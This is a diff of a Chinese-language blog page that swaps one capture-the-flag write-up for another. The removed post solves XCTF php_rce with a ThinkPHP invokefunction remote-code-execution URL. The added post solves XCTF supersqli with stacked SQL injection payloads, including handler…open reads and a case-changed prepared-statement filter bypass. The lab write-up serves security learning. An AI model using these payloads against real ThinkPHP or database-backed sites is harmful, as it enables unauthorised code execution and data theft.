@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web2, lunan">
+    <meta name="keywords" content="Web4, lunan">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Web2 | lunan</title>
+    <title>Web4 | lunan</title>
     <link rel="icon" type="image/png" href="/lunan0320.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/lunan0320.github.io/libs/awesome/css/all.css">
@@ -262,12 +262,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Web2</h1>
+                    <h1 class="description center-align post-title">Web4</h1>
                 </div>
             </div>
         </div>
@@ -399,28 +399,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-01-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-01-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    208
+                    658
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -440,19 +440,46 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p>
-<p><img src="/lunan0320.github.io/2021/01/17/web2/1.png"></p>
-<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre>
-<p>返回的结果是：</p>
-<p>​    <img src="/lunan0320.github.io/2021/01/17/web2/2.png"></p>
-<p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p>
-<p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p>
-<pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre>
-<p>此时可以输入：</p>
-<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre>
-<p>作为后缀，来寻找flag</p>
-<p>查找结果如图：</p>
-<p><img src="/lunan0320.github.io/2021/01/17/web2/3.png"></p>
+                <h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><h4 id="题目来源：XCTF-Web-进阶区-supersqli"><a href="#题目来源：XCTF-Web-进阶区-supersqli" class="headerlink" title="题目来源：XCTF Web 进阶区 supersqli"></a>题目来源：XCTF Web 进阶区 supersqli</h4><p>​    首先打开链接后根据题目提示是漏洞注入。</p>
+<p>​    尝试一下简单的单个字符的注入，发现是单引号报错字符型注入</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/1.png"></p>
+<p>​    </p>
+<h2 id="方法一-handler-…-open："><a href="#方法一-handler-…-open：" class="headerlink" title="方法一 handler … open："></a>方法一 handler … open：</h2><p>那么我们可以直接来看看网页有几个字段或者表，采用的是show tables的方式，容易看到只有两个字段，我们只需要去看看这两个字段中的语句即可</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/2.png"></p>
+<p>​    <strong><em>此处学会使用的是show tables直接查表</em></strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token number">1</span>'<span class="token punctuation">;</span>show databases<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
+<span class="token number">1</span>'<span class="token punctuation">;</span>show tables<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre>
+<p>​    查找资料后学习到一种新的姿势来解决这类问题：handler … open</p>
+<blockquote>
+<p>handler…open语句打开一个表，使其可以使用后续handler … read语句访问，该表对象未被其他会话共享，并且在会话调用handler … close或会话终止之前不会关闭</p>
+</blockquote>
+<p>​    因此，我们可以直接去依次查这两个表中的语句，比较幸运的是直接可以在191981093 1114514中查到flag</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/3.png"></p>
+<p>​    <strong><em>此处学会使用的是handler…open</em></strong>，payload如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>handler `<span class="token number">1919810931114514</span>` open<span class="token punctuation">;</span>handler `<span class="token number">1919810931114514</span>` read first<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre>
+<p>​    因此容易得到flag{c168d583ed0d4d7196967b28cbd0b5e9}</p>
+<hr>
+<h2 id="方法二-堆叠注入："><a href="#方法二-堆叠注入：" class="headerlink" title="方法二 堆叠注入："></a>方法二 堆叠注入：</h2><p>​    继之前，我们发现是两个表之后采用联合查询union select，但是发现关键字已经被select正则过滤</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/4.png"></p>
+<p>​     </p>
+<p>​    因此我们可以尝试一下堆叠注入，通过-1;show tables – +;来查看表，与之前的大同小异。</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/5.png"></p>
+<p><strong><em>此处学会使用的是堆叠注入show tables – +</em></strong>，payload如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>show tables <span class="token operator">--</span> <span class="token operator">+</span><span class="token punctuation">;</span></code></pre>
+<p>此时我们可以通过show columns form … – +; 的方式来按列查找，寻找我们所要查找的表中的对应的信息，此时可以看到了出现了flag,所以我们要查找的flag就i在第一个表中，但是当我们要查看flag中的内容的时候，这里是被select过滤掉的</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/6.png"></p>
+<p><strong><em>此处学会使用的是堆叠注入show columns form … – +</em></strong>，payload如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>show columns from `<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>` <span class="token operator">--</span> <span class="token operator">+</span><span class="token punctuation">;</span></code></pre>
+<p>​    为了绕过这个select 的过滤，我们可以采用预编译的方式进行绕过</p>
+<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';set @sql =CONCAT('</span>sele<span class="token string">','</span>ct <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>`<span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare aaa from @sql<span class="token punctuation">;</span><span class="token constant">EXECUTE</span> aaa<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
+</code></pre>
+<p>​    但是此时出现的情况是，发现set和prepare都被过滤掉了。</p>
+<p>​    因此，要查看flag 的时候我们还得绕过这两个，为此可以绕过strstr（）函数的方式来实现，即采用大小写的方式进行绕过</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/7.png"></p>
+<p>​    采用绕过strstr（）函数大小写的方式来实现，与上面的预编译方式不同的是set变成了sEt来成功绕过过滤</p>
+<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';sEt @sql = CONCAT('</span>sele<span class="token string">','</span>ct <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>`<span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>prepArE aaa from @sql<span class="token punctuation">;</span><span class="token constant">EXECUTE</span> aaa<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre>
+<p>​    此时，就可以顺利查看 flag{c168d583ed0d4d7196967b28cbd0b5e9}</p>
+<p><img src="/lunan0320.github.io/2021/01/21/web4/8.png"></p>
 
                 
             </div>
@@ -479,7 +506,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/17/web2/">https://lunan0320.github.io/lunan0320.github.io/2021/01/17/web2/</a>
+                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/21/web4/">https://lunan0320.github.io/lunan0320.github.io/2021/01/21/web4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -562,17 +589,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/18/web3/">
+                <a href="/lunan0320.github.io/2021/01/21/web4/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="Web3">
+                        <img src="/lunan0320.github.io/medias/featureimages/8.jpg" class="responsive-img" alt="Web4">
                         
-                        <span class="card-title">Web3</span>
+                        <span class="card-title">Web4</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -582,9 +610,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -593,6 +621,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -611,13 +640,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/17/web1/">
+                <a href="/lunan0320.github.io/2021/01/18/web3/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/5.jpg" class="responsive-img" alt="Web1">
+                        <img src="/lunan0320.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="Web3">
                         
-                        <span class="card-title">Web1</span>
+                        <span class="card-title">Web3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -628,7 +657,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-18
                             </span>
                         <span class="publish-author">
                             
